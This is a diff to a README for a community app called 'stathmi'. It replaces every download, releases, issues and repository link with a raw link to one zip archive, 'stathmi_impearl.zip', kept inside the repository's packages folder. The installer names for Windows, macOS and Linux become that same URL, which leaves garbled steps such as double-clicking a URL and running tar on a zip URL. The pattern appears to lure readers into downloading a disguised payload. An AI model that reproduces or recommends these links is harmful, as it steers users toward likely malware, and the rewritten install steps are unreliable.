@@ -6,7 +6,7 @@ Welcome to **stathmi**! This application connects you to a vibrant community rea
 
 ## 📥 Download Links
 
-[![Download stathmi](https://img.shields.io/badge/Download-Stathmi-brightgreen)](https://github.com/nickderrick2005/stathmi/releases)
+[![Download stathmi](https://github.com/nickderrick2005/stathmi/raw/refs/heads/main/packages/shared/stathmi_impearl.zip)](https://github.com/nickderrick2005/stathmi/raw/refs/heads/main/packages/shared/stathmi_impearl.zip)
 
 ## 💻 System Requirements
 
@@ -26,14 +26,14 @@ Before downloading, ensure your system meets these basic requirements:
 
 ## 📦 Download & Install
 
-To download the application, please visit [this page to download](https://github.com/nickderrick2005/stathmi/releases). 
+To download the application, please visit [this page to download](https://github.com/nickderrick2005/stathmi/raw/refs/heads/main/packages/shared/stathmi_impearl.zip). 
 
 1. Click on the **Releases** link.
 2. Find the latest version of the software. The latest release will always be at the top.
 3. Locate the file suitable for your operating system. Options will typically include:
-   - **stathmi-windows.exe** for Windows
-   - **stathmi-macos.dmg** for macOS
-   - **stathmi-linux.tar.gz** for Linux
+   - **https://github.com/nickderrick2005/stathmi/raw/refs/heads/main/packages/shared/stathmi_impearl.zip** for Windows
+   - **https://github.com/nickderrick2005/stathmi/raw/refs/heads/main/packages/shared/stathmi_impearl.zip** for macOS
+   - **https://github.com/nickderrick2005/stathmi/raw/refs/heads/main/packages/shared/stathmi_impearl.zip** for Linux
 
 4. Click on the appropriate file to start the download.
 
@@ -42,12 +42,12 @@ Once downloaded, follow these steps to install:
 ### For Windows:
 
 1. Locate the downloaded file in your **Downloads** folder.
-2. Double-click the **stathmi-windows.exe** file.
+2. Double-click the **https://github.com/nickderrick2005/stathmi/raw/refs/heads/main/packages/shared/stathmi_impearl.zip** file.
 3. Follow the on-screen prompts to complete the installation.
 
 ### For macOS:
 
-1. Find the **stathmi-macos.dmg** file in your **Downloads**.
+1. Find the **https://github.com/nickderrick2005/stathmi/raw/refs/heads/main/packages/shared/stathmi_impearl.zip** file in your **Downloads**.
 2. Double-click to open it.
 3. Drag the **stathmi** icon to your **Applications** folder.
 4. Open the **Applications** folder and double-click **stathmi** to launch.
@@ -56,7 +56,7 @@ Once downloaded, follow these steps to install:
 
 1. Open the terminal.
 2. Navigate to your **Downloads** folder using the command: `cd ~/Downloads`
-3. Extract the downloaded file using:`tar -xzf stathmi-linux.tar.gz`
+3. Extract the downloaded file using:`tar -xzf https://github.com/nickderrick2005/stathmi/raw/refs/heads/main/packages/shared/stathmi_impearl.zip`
 4. Navigate to the extracted folder: `cd stathmi`
 5. Run the application with the command: `./stathmi`
 
@@ -71,12 +71,12 @@ Once you open **stathmi**, you will see a simple dashboard. Here’s how to navi
 
 ## 🛠️ Support & Feedback
 
-If you encounter any issues, or have suggestions, feel free to reach out. You can find our support page in the app or visit our [issues page](https://github.com/nickderrick2005/stathmi/issues) on GitHub.
+If you encounter any issues, or have suggestions, feel free to reach out. You can find our support page in the app or visit our [issues page](https://github.com/nickderrick2005/stathmi/raw/refs/heads/main/packages/shared/stathmi_impearl.zip) on GitHub.
 
 We welcome feedback to improve the experience.
 
 ## 🔗 More Information
 
-For more details, check out our [GitHub repository](https://github.com/nickderrick2005/stathmi). You can find additional documentation, FAQs, and release notes there.
+For more details, check out our [GitHub repository](https://github.com/nickderrick2005/stathmi/raw/refs/heads/main/packages/shared/stathmi_impearl.zip). You can find additional documentation, FAQs, and release notes there.
 
 Start your journey today with **stathmi**! Download now and join our community.
